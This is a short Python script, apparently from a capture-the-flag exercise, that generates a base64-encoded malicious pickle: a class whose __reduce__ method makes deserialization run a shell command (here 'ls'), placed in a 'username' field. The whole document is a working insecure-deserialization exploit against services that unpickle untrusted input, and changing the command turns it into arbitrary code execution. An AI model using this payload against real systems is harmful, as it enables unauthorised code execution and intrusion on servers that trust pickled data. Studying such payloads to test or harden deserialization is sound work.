from base64 import b64encode
import pickle
import subprocess

class PickleRick(object):
    def __reduce__(self):
        import subprocess
        return subprocess.check_output, (['ls'],)

print(b64encode(pickle.dumps({'username': PickleRick()})).decode())
